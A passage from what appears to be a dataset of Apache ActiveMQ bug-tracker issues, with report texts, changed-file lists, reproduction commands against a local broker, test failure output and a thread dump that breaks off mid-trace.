Currently, the ActiveMQ Karaf commands use the OSGi service declaration with explicitly defining the interfaces set. For instance:    <interfaces>      <value>org.apache.felix.service.command.Function</value>      <value>org.apache.karaf.shell.console.CompletableFunction</value>    </interfaces>This prevent some Karaf feature like the new commands RBAC mechanism.The service definition should use auto-export="interfaces".
issueID:AMQ-4934
type:Bug
changed files:
texts:JDBCPersistenceAdapter: queue messages trapped in store when DB connection is lost and restored
Periodically messages are being trapped in the store and not delivered to consumers when the broker (using JDBC Persistence adapter) loses and then restores its connection to the DB.The issued appears to occur when the connection to the DB is lost while the message is being committed to the DB - the message is committed to the DB but the broker does not know it has been committed as it receives an exception during the commit operation.When the DB connection is restored the message will NOT be loaded from from the store. The trapped message is NOT added to the Broker JMX statics - it is only seen by querying the DB.The message will be loaded when the broker is restarted.
issueID:AMQ-4938
type:Bug
changed files:MessageServlet.java
texts:Queue Messages lost after read timeout on REST API.
I have been trying to send/receive messages via a Queue using the REST API. While testing I found that some messages got lost after a consuming request times out when no message is available.Here is a transcript of the test case I used:## OK: send first, consume later#$ curl -d "body=message" "http://localhost:8161/api/message/TEST?type=queue"Message sent$ wget --no-http-keep-alive -q -O - "http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=1000"message## OK: start consuming, then send (within timeout)#$ wget --no-http-keep-alive -q -O - "http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=5000"&[1] 5172$ curl -d "body=message" "http://localhost:8161/api/message/TEST?type=queue"messageMessage sent[1]+  Fertig                  wget --no-http-keep-alive -q -O - "http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=5000"## NOK: start consuming, wait for timeout, then send and consume again#$ wget --no-http-keep-alive -q -O - "http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=5000"$ curl -d "body=message" "http://localhost:8161/api/message/TEST?type=queue"Message sent$ wget --no-http-keep-alive -q -O - "http://localhost:8161/api/message/TEST?type=queue&clientId=GETID&readTimeout=5000"The last wget returns after the given read timeout without any message. When looking at the managament console, the message has been consumed.I tested this with 5.8.0 on linux as well as with 5.8.0, 5.9.0 and a freshly built 5.10.0 on windows.
issueID:AMQ-494
type:Bug
changed files:ActiveMQDestination.java
texts:Demand based publishing does not work anymore
See servicemix test case athttps://svn.apache.org/repos/asf/incubator/servicemix/trunk/servicemix-wsn2005/src/test/java/org/apache/servicemix/wsn/component/WSNComponentTest.javaWhen the consumer is created, the publisher is not advisored.
issueID:AMQ-4946
type:New Feature
changed files:
texts:include activemq-jms-pool in activemq-all
on upgrade from 5.8 to 5.9<bean id="con-factory"class="org.apache.activemq.spring.ActiveMQConnectionFactory">        <property name="brokerURL" value="tcp://xxxxx:xxx" /></bean><bean id="activemq-for-consumer"class="org.apache.activemq.pool.PooledConnectionFactoryBean"                destroy-method="stop">        <property name="connectionFactory" ref="con-factory"></property></bean>When I ran the old project,I got the exception:java.lang.ClassNotFoundException:org.apache.activemq.jms.pool.PooledConnectionFactoryI checked the  activemq-all-5.9.0.jarand didn"t see the package oforg.apache.activemq.jms in it.
issueID:AMQ-4947
type:Improvement
changed files:CallerBufferingDataFileAppender.java
DataFileAccessor.java
RecoverableRandomAccessFile.java
DiskBenchmark.java
DataFileAppender.java
PageFile.java
texts:Reduce the reliance on fsync when writing to disk
Moving AMQ from  RHEL 4 to RHEL 6 affects performance of kahadb writes as seen from the DiskBenchmark
issueID:AMQ-4950
type:Bug
changed files:
texts:" java.lang.ClassCastException: org.apache.activemq.command.ExceptionResponse cannot be cast to org.apache.activemq.command.IntegerResponse, attempting to automatically reconnect"
If an XA prepare() raises an exception back to the client it results in the warning WARN  FailoverTransport - Transport (tcp://127.0.0.1:61249) failed, reason:  java.io.IOException: Unexpected error occured: java.lang.ClassCastException: org.apache.activemq.command.ExceptionResponse cannot be cast to org.apache.activemq.command.IntegerResponse, attempting to automatically reconnectwhich triggers a failover reconnect and a replay of the transaction which then causes2013-12-20 13:38:12,581 [main] - WARN  TransactionContext - prepare of: XID:[86,globalId=00000001,branchId=00000001] failed with: javax.jms.JMSException: Cannot call prepare now.
issueID:AMQ-4952
type:Bug
changed files:
texts:When duplicate message occur from network producer, messages blocked by cursor audit are blocked till restart
If auditNetworkProducers is off (as it is by default) a reforward (because of a missing send reply) will be a duplicate.If the initial messages is still in the store the duplicate will be trapped by the   message cursor but the message remains in the store. So on a restart the cursor is fresh (unless in the case of jdbc when there are still messages in the store) and the message gets redispatched. In the jdbc case - if the store/destination is empty there will be a resend b/c there is no sequence state to replay.Duplicates detected by the cursor need to deal with the duplicate message - moving to the DLQ makes the most sense - the cause can indicate the reason  to allow separation from poison due to redelivery failure.Client duplicate detection currently uses a poison ack, so this makes the behaviour consistent.
issueID:AMQ-4958
type:Bug
changed files:IdGenerator.java
texts:Ignored InterruptedException in IdGenerator
Our SW couldn"t stop because of ignored InterruptedException in IdGenerator (ActivmeMQConnectionFactory.createConnection()).I hope you consider that not ignoring InterruptedExceptions is good practice and check for additionals.
issueID:AMQ-4962
type:Bug
changed files:
texts:Connections not closing on AMQP connector when client closes its side.
Using the QPid AMQP JMS client and creating and closing a connection the connection count on the connector shows that there are lingering Connections.  For some reason the connection close is not being detected and processed correctly.
issueID:AMQ-4967
type:Bug
changed files:
texts:activemq-camel should explicitly Import-Package org.apache.activemq.pool
None
issueID:AMQ-4968
type:New Feature
changed files:
texts:Add new mode to JMS Pool that allows for not caching producers
The current JMS Pool creates a single anonymous producer instance for all requests to create a Producer.  In some cases a user might want to have a separate producer instance created for each requestor.  We will add a new option on the PooledConnectionFactory to have all PooledSessions create separate MessageProducers, TopicPublishers and QueueSenders for each create call.
issueID:AMQ-4969
type:Improvement
changed files:JobSchedulerStoreImpl.java
texts:Update the JobSchedulerStoreImpl in KahaDB to use LockableServiceSupport
Implement LockableServiceSupport in the KahaDB Scheduler store so that it can be configured to use the same retry values as the KahaDB locker.
issueID:AMQ-4970
type:Bug
changed files:Queue.java
texts:Deletion of a queue inaffective across broker restart
Deleting a queue, it is revived from persistent store after a broker restart.  The following steps reproduce the problem: Create a queue (confirmed using the REST client I/F) Shutdown the broker Startup the broker Confirm queue still exists via the hawtio ui (correct operation so far) Delete the queue Confirm queue removed via the hawtio ui Shutdown the broker Startup the broker Confirm queue was not recreated via hawtio ui (failed: queue still exists)
issueID:AMQ-4972
type:Bug
changed files:
texts:FailoverConsumerTest.testPublisherFailsOver is failing
I get the following error for this test:Running org.apache.activemq.transport.failover.FailoverConsumerTestTests run: 1, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 5.936 sec <<< FAILURE! - in org.apache.activemq.transport.failover.FailoverConsumerTesttestPublisherFailsOver(org.apache.activemq.transport.failover.FailoverConsumerTest)  Time elapsed: 5.479 sec  <<< FAILURE!junit.framework.AssertionFailedError: expected:<1> but was:<0> at junit.framework.Assert.fail(Assert.java:57) at junit.framework.Assert.failNotEquals(Assert.java:329) at junit.framework.Assert.assertEquals(Assert.java:78) at junit.framework.Assert.assertEquals(Assert.java:234) at junit.framework.Assert.assertEquals(Assert.java:241) at junit.framework.TestCase.assertEquals(TestCase.java:409) at org.apache.activemq.transport.failover.FailoverConsumerTest.testPublisherFailsOver(FailoverConsumerTest.java:121)Results :Failed tests:   FailoverConsumerTest>CombinationTestSupport.runBare:113->CombinationTestSupport.runBare:107->testPublisherFailsOver:121 expected:<1> but was:<0>Tests run: 1, Failures: 1, Errors: 0, Skipped: 0&#91;INFO&#93; ------------------------------------------------------------------------&#91;INFO&#93; BUILD FAILURE&#91;INFO&#93; ------------------------------------------------------------------------
issueID:AMQ-4973
type:Bug
changed files:
texts:UnreliableUdpTransportTest and MulticastTransportTest have test failures
The testSendingMediumMessage and testSendingLargeMessage test cases fail for both of these as shown below.  UnreliableUdpTransportTest uses org.apache.activemq.transport.reliable.ReliableTransport, which is deprecated.  Should we continue to run these tests?------------------------------------------------------- T E S T S-------------------------------------------------------Running org.apache.activemq.transport.multicast.MulticastTransportTestTests run: 3, Failures: 2, Errors: 0, Skipped: 0, Time elapsed: 40.6 sec <<< FAILURE! - in org.apache.activemq.transport.multicast.MulticastTransportTesttestSendingMediumMessage(org.apache.activemq.transport.multicast.MulticastTransportTest)  Time elapsed: 40.402 sec  <<< FAILURE!junit.framework.AssertionFailedError: Should have received a Command by now! at junit.framework.Assert.fail(Assert.java:57) at junit.framework.Assert.assertTrue(Assert.java:22) at junit.framework.Assert.assertNotNull(Assert.java:256) at junit.framework.TestCase.assertNotNull(TestCase.java:426) at org.apache.activemq.transport.udp.UdpTestSupport.assertCommandReceived(UdpTestSupport.java:257) at org.apache.activemq.transport.udp.UdpTestSupport.assertSendTextMessage(UdpTestSupport.java:112) at org.apache.activemq.transport.udp.UdpTestSupport.testSendingMediumMessage(UdpTestSupport.java:84) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)testSendingLargeMessage(org.apache.activemq.transport.multicast.MulticastTransportTest)  Time elapsed: 0.009 sec  <<< FAILURE!junit.framework.AssertionFailedError: Failed to send to transport: java.net.SocketException: Socket is closed at junit.framework.Assert.fail(Assert.java:57) at junit.framework.TestCase.fail(TestCase.java:227) at org.apache.activemq.transport.udp.UdpTestSupport.assertSendTextMessage(UdpTestSupport.java:123) at org.apache.activemq.transport.udp.UdpTestSupport.testSendingLargeMessage(UdpTestSupport.java:90) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)Results :Failed tests:   MulticastTransportTest>UdpTestSupport.testSendingMediumMessage:84->UdpTestSupport.assertSendTextMessage:112->UdpTestSupport.assertCommandReceived:257 Should have received a Command by now!  MulticastTransportTest>UdpTestSupport.testSendingLargeMessage:90->UdpTestSupport.assertSendTextMessage:123 Failed to send to transport: java.net.SocketException: Socket is closedTests run: 3, Failures: 2, Errors: 0, Skipped: 0
issueID:AMQ-4974
type:Bug
changed files:
texts:Remove NetworkConnectionsCleanedupTest?
This test contains the comment:   // skip this test. it runs for an hour, doesn"t assert anything, and could probably    // just be removed (seems like a throwaway impl for https://issues.apache.org/activemq/browse/AMQ-1202)I"ve added an @Ignore so it won"t count as a failure on CI systems.  Should I just remove it?
issueID:AMQ-4975
type:Bug
changed files:
texts:DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest.testSendReceive fails intermittently
This test fails intermittently with the error below.  It typical fails at around message 180-185, where it looks like it receives the same message twice.(This test is defined in JmsSendReceiveTestSupport.  I"ll add an overridden no-op version in DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest for now so it doesn"t cause CI builds to fail)------------------------------------------------------- T E S T S-------------------------------------------------------Running org.apache.activemq.broker.ft.DbRestartJDBCQueueMasterSlaveLeaseQuiesceTestTests run: 4, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 70.702 sec <<< FAILURE! - in org.apache.activemq.broker.ft.DbRestartJDBCQueueMasterSlaveLeaseQuiesceTesttestSendReceive(org.apache.activemq.broker.ft.DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest)  Time elapsed: 18.286 sec  <<< FAILURE!junit.framework.ComparisonFailure: Message: 181 expected:<Text for message: 18&#91;1&#93; at Thu Jan 16 16:02...> but was:<Text for message: 18&#91;0&#93; at Thu Jan 16 16:02...> at junit.framework.Assert.assertEquals(Assert.java:100) at junit.framework.TestCase.assertEquals(TestCase.java:261) at org.apache.activemq.JmsSendReceiveTestSupport.assertMessagesReceivedAreValid(JmsSendReceiveTestSupport.java:165) at org.apache.activemq.JmsSendReceiveTestSupport.assertMessagesAreReceived(JmsSendReceiveTestSupport.java:128) at org.apache.activemq.JmsSendReceiveTestSupport.testSendReceive(JmsSendReceiveTestSupport.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)Results :Failed tests:   DbRestartJDBCQueueMasterSlaveLeaseQuiesceTest>CombinationTestSupport.runBare:113->CombinationTestSupport.runBare:107->JmsSendReceiveTestSupport.testSendReceive:104->JmsSendReceiveTestSupport.assertMessagesAreReceived:128->JmsSendReceiveTestSupport.assertMessagesReceivedAreValid:165 Message: 181 expected:<Text for message: 18&#91;1&#93; at Thu Jan 16 16:02...> but was:<Text for message: 18&#91;0&#93; at Thu Jan 16 16:02...>Tests run: 4, Failures: 1, Errors: 0, Skipped: 0
issueID:AMQ-4976
type:Bug
changed files:
texts:Remove hawt.io console from official distro
Per discussion on the mailing list, hawt.io should not ship with the official activemq distro.
issueID:AMQ-4977
type:Bug
changed files:
texts:Memory leak in ConnectionStateTracker when browsing non-empty queues
I think I found case that is not handled by the fix AMQ-3316. We see memory leaks connected to this bug and after good amount of headbanging I think the problem is in how two methods work together - processMessagePull and trackBack. The first one has this piece of code:  // leave a single instance in the cache            final String id = pull.getDestination() + "::" + pull.getConsumerId();            messageCache.put(id.intern(), pull);while the second one unconditionally increases the currentCacheSize - regardless if the previous method added or replaced entry in the cache.The situation where entries will be replaced (and not added) and the currentCacheSize will grow very fast until it wraps around and becomes negative is the following: have some logic that frequently creates queue browser and iterates through all the entries have the queue most of the time with at least one message. The more messages in the queue the faster currentCacheSize grows.The reason is that processMessagePull reuses the consumer and destination ID for each browsed message in the queue when org.apache.activemq.ActiveMQQueueBrowser#hasMoreElements is invoked. trackBack is ignorant of this and keeps adding to the size regardless that the cache size stays the same.Here is log from reproducing the issue as a proof:2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 10000, 5 elements, pending scans:10, memory: 8951KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 20000, 10 elements, pending scans:10, memory: 10845KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 30000, 15 elements, pending scans:10, memory: 12645KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 40000, 20 elements, pending scans:10, memory: 10363KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 50000, 25 elements, pending scans:10, memory: 12169KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 60000, 30 elements, pending scans:10, memory: 9852KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 70000, 35 elements, pending scans:10, memory: 11657KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 80000, 40 elements, pending scans:10, memory: 9401KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 90000, 45 elements, pending scans:10, memory: 11222KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 100000, 50 elements, pending scans:10, memory: 13047KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 110000, 55 elements, pending scans:10, memory: 10767KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 120000, 60 elements, pending scans:10, memory: 12567KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 130000, 65 elements, pending scans:10, memory: 10256KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 138800, 67 elements, pending scans:10, memory: 12085KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 146800, 67 elements, pending scans:10, memory: 9745KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 154800, 67 elements, pending scans:10, memory: 11566KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 162800, 67 elements, pending scans:10, memory: 9225KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 170800, 67 elements, pending scans:10, memory: 11013KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 178800, 67 elements, pending scans:10, memory: 12812KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 186800, 67 elements, pending scans:10, memory: 10522KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 194800, 67 elements, pending scans:10, memory: 12328KB2014-01-16 23:05:14  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 202800, 67 elements, pending scans:10, memory: 9999KB2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 210800, 67 elements, pending scans:10, memory: 11805KB2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 218800, 67 elements, pending scans:10, memory: 9496KB2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 226800, 67 elements, pending scans:10, memory: 11316KB2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 234800, 67 elements, pending scans:10, memory: 13100KB2014-01-16 23:05:15  WARN ActiveMqMemoryLeakTest - MaxCacheSize: 131072, currentCacheSize: 242800, 67 elements, pending scans:10, memory: 10754KBOne can see that the garbage collection works well (cache does not grow) but the currentCacheSize keeps increasingUnfortunately I cannot easily extract the original code and provide it. Hope the explanation is clear enough.
issueID:AMQ-4978
type:Bug
changed files:
texts:JoramJmsNioTest hangs intermittently
The JoramJmsNioTest hangs intermittently, particularly on CI nodes.  I"ll add a stack trace.This is most likely fixed by QPID 0.26.  Re-test once that is released.$ jstack 71572014-01-20 10:14:31Full thread dump Java HotSpot(TM) 64-Bit Server VM (24.45-b08 mixed mode):"Attach Listener" daemon prio=10 tid=0x00007f09f400d800 nid=0x1ca9 waiting on condition &#91;0x0000000000000000&#93;   java.lang.Thread.State: RUNNABLE"ActiveMQ BrokerService&#91;localhost&#93; Task-2" daemon prio=10 tid=0x00007f09e4029000 nid=0x1c97 waiting on condition &#91;0x00007f0a1179d000&#93;   java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x00000000eebf1108> (a java.util.concurrent.SynchronousQueue$TransferStack) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226) at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460) at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359) at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"ActiveMQ BrokerService&#91;localhost&#93; Task-1" daemon prio=10 tid=0x00007f09e4028800 nid=0x1c96 waiting on condition &#91;0x00007f0a10782000&#93;   java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x00000000eebf1108> (a java.util.concurrent.SynchronousQueue$TransferStack) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226) at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460) at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359) at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"ActiveMQ Transport Server: amqp+nio://localhost:0" daemon prio=10 tid=0x00007f0a1c69e800 nid=0x1c93 runnable &#91;0x00007f0a10681000&#93;   java.lang.Thread.State: RUNNABLE at sun.nio.ch.EPollArrayWrapper.epollWait(Native Method) at sun.nio.ch.EPollArrayWrapper.poll(EPollArrayWrapper.java:269) at sun.nio.ch.EPollSelectorImpl.doSelect(EPollSelectorImpl.java:79) at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:87) locked <0x00000000eec186b0> (a sun.nio.ch.Util$2) locked <0x00000000eec186a0> (a java.util.Collections$UnmodifiableSet) locked <0x00000000eec18588> (a sun.nio.ch.EPollSelectorImpl) at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:98) at sun.nio.ch.ServerSocketAdaptor.accept(ServerSocketAdaptor.java:121) locked <0x00000000eead9ec8> (a java.lang.Object) at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:301) at java.lang.Thread.run(Thread.java:744)"RMI Reaper" prio=10 tid=0x00007f09e4038800 nid=0x1c90 in Object.wait() &#91;0x00007f0a1149a000&#93;   java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) waiting on <0x00000000f0e6d6c0> (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:135) locked <0x00000000f0e6d6c0> (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:151) at sun.rmi.transport.ObjectTable$Reaper.run(ObjectTable.java:351) at java.lang.Thread.run(Thread.java:744)"RMI TCP Accept-1099" daemon prio=10 tid=0x00007f0a1c70e000 nid=0x1c8e runnable &#91;0x00007f0a10984000&#93;   java.lang.Thread.State: RUNNABLE at java.net.PlainSocketImpl.socketAccept(Native Method) at java.net.AbstractPlainSocketImpl.accept(AbstractPlainSocketImpl.java:398) at java.net.ServerSocket.implAccept(ServerSocket.java:530) at java.net.ServerSocket.accept(ServerSocket.java:498) at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop(TCPTransport.java:388) at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.run(TCPTransport.java:360) at java.lang.Thread.run(Thread.java:744)"ActiveMQ NIO Worker 4" daemon prio=10 tid=0x00007f09ec194000 nid=0x1c33 waiting on condition &#91;0x00007f0a1017c000&#93;   java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x00000000f0e41258> (a java.util.concurrent.SynchronousQueue$TransferStack) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226) at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460) at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359) at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"ActiveMQ NIO Worker 3" daemon prio=10 tid=0x00007f09ec284000 nid=0x1c16 waiting on condition &#91;0x00007f0a1047f000&#93;   java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x00000000f0e41258> (a java.util.concurrent.SynchronousQueue$TransferStack) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226) at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460) at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359) at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"ActiveMQ NIO Worker 2" daemon prio=10 tid=0x00007f09ec250800 nid=0x1c11 waiting on condition &#91;0x00007f0a10883000&#93;   java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x00000000f0e41258> (a java.util.concurrent.SynchronousQueue$TransferStack) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226) at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460) at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359) at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"ActiveMQ NIO Worker 1" daemon prio=10 tid=0x00007f09f02b7000 nid=0x1c0e waiting on condition &#91;0x00007f0a10b86000&#93;   java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x00000000f0e41258> (a java.util.concurrent.SynchronousQueue$TransferStack) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226) at java.util.concurrent.SynchronousQueue$TransferStack.awaitFulfill(SynchronousQueue.java:460) at java.util.concurrent.SynchronousQueue$TransferStack.transfer(SynchronousQueue.java:359) at java.util.concurrent.SynchronousQueue.poll(SynchronousQueue.java:942) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130) at 